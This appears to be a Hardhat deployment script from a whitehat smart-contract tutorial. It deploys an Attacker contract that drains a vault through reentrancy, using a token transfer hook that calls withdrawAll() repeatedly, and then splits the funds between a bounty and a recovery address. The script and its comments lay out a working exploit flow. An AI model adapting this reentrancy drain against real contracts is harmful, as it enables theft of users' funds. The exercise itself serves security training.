/// @notice Step 4 (Whitehat): Deploy Attacker and drain the vault.
///
/// The attack flow:
///   1. Register a transfer hook on MockToken so this contract gets a callback on receive
///   2. Deposit seed tokens to establish a non-zero balance in the vault
///   3. Call withdrawAll() — vault transfers tokens, triggering our hook
///   4. Inside onTokenTransfer(), call withdrawAll() again (balance still non-zero)
///   5. Repeat until the vault is empty
///   6. Split the haul per Safe Harbor terms and walk away clean
///
/// Prerequisites:
///   PRIVATE_KEY      — stored in Hardhat keystore (run: just hh-import-key)
///   TOKEN_ADDRESS    — set in .env after running: just hh-setup
///   VAULT_ADDRESS    — set in .env after running: just hh-setup
///   RECOVERY_ADDRESS — set in .env (your wallet address)
///
/// Usage:
///   npm run attack
///   (or: npx hardhat run scripts/hardhat/attack.ts)

import { ethers } from "ethers";
import { network } from "hardhat";

const SEED_AMOUNT = ethers.parseEther("100");
const BOUNTY_BPS = 1_000n; // 10%

const tokenAddress   = process.env["TOKEN_ADDRESS"];
const vaultAddress   = process.env["VAULT_ADDRESS"];
const recoveryAddress = process.env["RECOVERY_ADDRESS"];

if (!tokenAddress)    throw new Error("TOKEN_ADDRESS not set in .env");
if (!vaultAddress)    throw new Error("VAULT_ADDRESS not set in .env");
if (!recoveryAddress) throw new Error("RECOVERY_ADDRESS not set in .env");

const { ethers: hethers } = await network.connect({
  network: "battlechain",
  chainType: "l1",
});

const [signer] = await hethers.getSigners();

const erc20ABI = ["function balanceOf(address) view returns (uint256)"];
const token = new ethers.Contract(tokenAddress, erc20ABI, hethers.provider);

const vaultBefore = await token.balanceOf(vaultAddress);
console.log("Vault balance before:", ethers.formatEther(vaultBefore), "tokens");
console.log("Deploying attacker...");

// Deploy Attacker
const Attacker = await hethers.getContractFactory("Attacker");
const attacker = await Attacker.connect(signer).deploy(
  vaultAddress,
  tokenAddress,
  recoveryAddress,
  BOUNTY_BPS
);
await attacker.waitForDeployment();
const attackerAddress = await attacker.getAddress();
console.log("Attacker deployed:", attackerAddress);

// Execute
const tx = await (attacker as ethers.Contract).attack(SEED_AMOUNT);
await tx.wait();

// Tally
const vaultAfter  = await token.balanceOf(vaultAddress);
const bounty      = await token.balanceOf(signer.address);
const returned    = await token.balanceOf(recoveryAddress);

console.log("\n--- Vault drained ---");
console.log("Vault before:        ", ethers.formatEther(vaultBefore), "tokens");
console.log("Vault after:         ", ethers.formatEther(vaultAfter), "tokens");
console.log("Bounty kept:         ", ethers.formatEther(bounty), "tokens");
console.log("Returned to protocol:", ethers.formatEther(returned), "tokens");
